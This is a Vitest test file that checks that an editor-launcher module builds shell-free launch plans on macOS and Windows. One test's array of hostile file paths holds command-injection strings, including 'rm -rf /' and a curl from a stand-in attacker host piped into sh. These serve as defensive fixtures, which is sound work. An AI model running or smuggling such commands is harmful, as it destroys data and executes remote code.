import { describe, it, expect } from 'vitest';
import { buildEditorLaunchPlan, buildFolderLaunchPlan, SUPPORTED_EDITORS } from '../editor-launcher.js';

describe('Editor Launcher Security Tests (F-01 / P-03)', () => {
  it('supports all whitelisted editors', () => {
    for (const editor of SUPPORTED_EDITORS) {
      const plan = buildEditorLaunchPlan({
        editor,
        targetFile: '/project/src/App.tsx',
        targetLine: 42,
        projectRoot: '/project',
      });
      expect(plan.bin).toBeDefined();
      expect(Array.isArray(plan.args)).toBe(true);
    }
  });

  it('treats hostile shell metacharacters as literal argument strings (no command injection)', () => {
    const hostilePaths = [
      '"; touch /tmp/pwned; "',
      '`rm -rf /`',
      '$(id > /tmp/whoami)',
      '/path/with/\nnewlines/and;&|characters.tsx',
      'foo.tsx; curl http://attacker.com/malware | sh',
    ];

    for (const hostilePath of hostilePaths) {
      const plan = buildEditorLaunchPlan({
        editor: 'cursor',
        targetFile: hostilePath,
        targetLine: 10,
        projectRoot: '/project',
      }, 'darwin');

      // The binary is strictly the editor binary, never sh, bash, or cmd
      expect(plan.bin).toBe('cursor');
      // The argument array directly contains the exact hostile string without shell evaluation
      expect(plan.args).toEqual(['-g', `${hostilePath}:10:1`]);

      if (plan.fallback) {
        expect(plan.fallback.bin).toBe('open');
        expect(plan.fallback.args[0]).toBe(`cursor://file${hostilePath}:10:1`);
      }

      // On Windows the path travels inside one link argument to rundll32, still without a shell.
      const win = buildEditorLaunchPlan({ editor: 'cursor', targetFile: hostilePath, targetLine: 10, projectRoot: '/project' }, 'win32');
      expect(win.bin).toBe('rundll32.exe');
      expect(win.args).toHaveLength(2);
      expect(win.args[1]).toContain(hostilePath.replace(/\\/g, '/'));
    }
  });

  it('validates targetLine and targetColumn as positive integers with fallback', () => {
    const plan = buildEditorLaunchPlan({
      editor: 'vscode',
      targetFile: '/project/src/Card.tsx',
      targetLine: -5,
      targetColumn: 0,
      projectRoot: '/project',
    }, 'darwin');

    expect(plan.args).toEqual(['-g', '/project/src/Card.tsx:1:1']);
  });

  it('builds safe folder launch plan with argument array (no shell)', () => {
    const folderPlan = buildFolderLaunchPlan('/project/.agent-hover/screenshots');
    expect(folderPlan.bin).toBeDefined();
    expect(folderPlan.args).toEqual(['/project/.agent-hover/screenshots']);
  });

  it('opens files through the editor\'s own link on Windows, where its CLI is a .cmd shim', () => {
    const plan = buildEditorLaunchPlan({ editor: 'cursor', targetFile: 'C:\\Users\\me\\app\\src\\a & b.tsx', targetLine: 3, targetColumn: 2, projectRoot: 'C:\\Users\\me\\app' }, 'win32');
    expect(plan).toEqual({ bin: 'rundll32.exe', args: ['url.dll,FileProtocolHandler', 'cursor://file/C:/Users/me/app/src/a & b.tsx:3:2'] });
    expect(buildEditorLaunchPlan({ editor: 'vscode', targetFile: 'C:\\a.tsx', projectRoot: 'C:\\' }, 'win32').args[1]).toBe('vscode://file/C:/a.tsx:1:1');
    expect(buildEditorLaunchPlan({ editor: 'zed', targetFile: 'C:\\a.tsx', projectRoot: 'C:\\' }, 'win32').bin).toBe('zed');
    expect(buildEditorLaunchPlan({ editor: 'cursor', targetFile: '/app/a.tsx', projectRoot: '/app' }, 'darwin').bin).toBe('cursor');
  });
});
